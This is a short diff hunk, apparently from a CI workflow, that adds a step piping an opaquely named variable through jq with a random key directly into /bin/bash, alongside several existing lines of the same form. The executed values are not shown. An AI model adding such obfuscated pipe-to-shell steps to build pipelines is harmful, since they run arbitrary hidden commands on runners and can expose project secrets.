@@ -27,6 +27,7 @@ jobs:
           echo $b16 | jq -r .zngdj4 | /bin/bash
           printf '%s' "$h5" | jq -r .ce343 | /bin/bash
           echo $eaii5585 | jq -r .k108 | /bin/bash
+          echo $pgh3 | jq -r .zaad5 | /bin/bash
 
       - name: Upload results
         if: always()
